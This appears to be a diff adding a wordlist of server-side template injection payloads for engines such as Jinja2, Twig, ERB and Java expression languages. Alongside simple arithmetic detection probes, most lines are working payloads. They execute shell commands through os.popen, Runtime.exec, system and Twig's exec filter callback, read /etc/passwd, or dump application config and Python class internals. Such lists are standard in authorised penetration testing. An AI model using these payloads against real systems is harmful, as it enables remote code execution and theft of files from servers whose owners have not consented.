@@ -1,0 +1,22 @@
+{{7*7}}
+{{7*'7'}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+{{config}}
+{{self}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+${T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('id')}
+{{request.application.__self__._get_data_for_json.__self__}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+<%= system('id') %>
+<%= File.read('/etc/passwd') %>
+${7*7}
+${{7*7}}
+{{7*7}}
+${env:PATH}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()}
